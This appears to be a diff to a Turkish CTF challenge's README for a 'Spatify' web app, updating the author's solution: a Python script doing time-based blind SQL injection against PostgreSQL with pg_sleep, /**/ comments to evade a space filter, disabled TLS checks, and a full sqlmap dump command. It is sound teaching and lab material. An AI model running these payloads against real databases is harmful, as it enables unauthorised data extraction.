@@ -1,7 +1,7 @@
 # Projeyi ayağa kaldırır (İlk kurulumda kullanılır)
 sudo docker compose up --build
 
-Sistem ayağa kalktıktan sonra tarayıcınızdan http://localhost:3000
+Sistem ayağa kalktıktan sonra tarayıcınızdan https://spatify.skydays.ctf
 adresine giderek soruya ulaşabilirsiniz.
 
 Sorumuzda 3 flag olacak.
@@ -66,8 +66,12 @@ Otomatize eden python Scripti:
 ```
 import requests
 import time
+import urllib3
 
-BASE_URL = "http://localhost:3000"
+# 1. Adım: Sürekli çıkan "Güvensiz Bağlantı" uyarılarını susturalım
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+BASE_URL = "https://spatify.skydays.ctf"
 LOGIN_URL = f"{BASE_URL}/login"
 TARGET_URL = f"{BASE_URL}/upload"
 
@@ -78,21 +82,24 @@ CREDENTIALS = {
 
 def pwn_spatify():
     session = requests.Session()
-    print("🔑 Giriş yapiliyor...")
-    session.post(LOGIN_URL, data=CREDENTIALS)
+    # 2. Adım: Sertifika doğrulamasını global olarak kapatalım
+    session.verify = False 
     
+    print("🔑 Giriş yapiliyor...")
+    try:
+        session.post(LOGIN_URL, data=CREDENTIALS)
+    except Exception as e:
+        print(f"❌ Giriş başarisiz: {e}")
+        return
+
     flag = ""
-    # Flag genelde 15-30 karakter arası olur
+    print("🚀 Flag sökme işlemi başladi...")
+    
     for i in range(1, 40): 
         found = False
-        # 32'den 126'ya kadar tüm ASCII karakterleri dene (Harfler, rakamlar, parantezler)
         for char_code in range(32, 127):
-            # PAYLOAD AÇIKLAMASI:
-            # 1. 'Katarakt' şarkısını bul.
-            # 2. Flag'in i. karakterinin ASCII kodunu kontrol et.
-            # 3. Doğruysa 3 saniye uyu.
-            # 4. IS NULL ekledik çünkü pg_sleep 'void' döner, void her zaman null kabul edilebilir.
-            payload = f"Katarakt' AND (SELECT CASE WHEN (ascii(SUBSTRING((SELECT flag FROM flag LIMIT 1),{i},1))={char_code}) THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NULL AND '1'='1"
+            # KRİTİK: Boşluk yasağını geçmek için /**/ ekledik
+            payload = f"Katarakt'/**/AND/**/(SELECT/**/CASE/**/WHEN/**/(ascii(SUBSTR((SELECT/**/flag/**/FROM/**/flag/**/LIMIT/**/1),{i},1))={char_code})/**/THEN/**/pg_sleep(3)/**/ELSE/**/pg_sleep(0)/**/END)/**/IS/**/NULL/**/AND/**/'1'='1"
             
             data = {
                 "songName": payload,
@@ -101,8 +108,8 @@ def pwn_spatify():
 
             start = time.time()
             try:
-                # 10 saniye bekliyoruz ki uykuya daldığında bağlantı kopmasın
-                session.post(TARGET_URL, data=data, timeout=10)
+                # verify=False parametresini burada da garantiye alıyoruz
+                session.post(TARGET_URL, data=data, timeout=15)
                 elapsed = time.time() - start
 
                 if elapsed >= 3:
@@ -121,8 +128,9 @@ def pwn_spatify():
 
 if __name__ == "__main__":
     pwn_spatify()
+
 ```
-Ayrıca sqlmap çözümü: sqlmap -u "http://localhost:3000/upload" --data="songName=Katarakt&action=check" --method=POST --cookie="connect.sid=COOKIE_DEGERIN" --dbms=postgresql --level=5 --risk=3 -T flag -C flag --dump --batch
+Ayrıca sqlmap çözümü: sqlmap -u "https://spatify.skydays.ctf/upload" --data="songName=Katarakt&action=check" --method=POST --cookie="connect.sid=YENI_COOKIE_DEGERIN_BURAYA" --dbms=postgresql --technique=B --threads=10 -T flag -C flag --dump --batch --force-ssl
 
 ---------------------------------------------
 **NOT**:Her input sanitize edilmiştir mesela login pageden flag tablosuna erişim kısıtlanmıştır bu yüzden yarısmacılar 3. flag için time-based sql kullanması gerekir
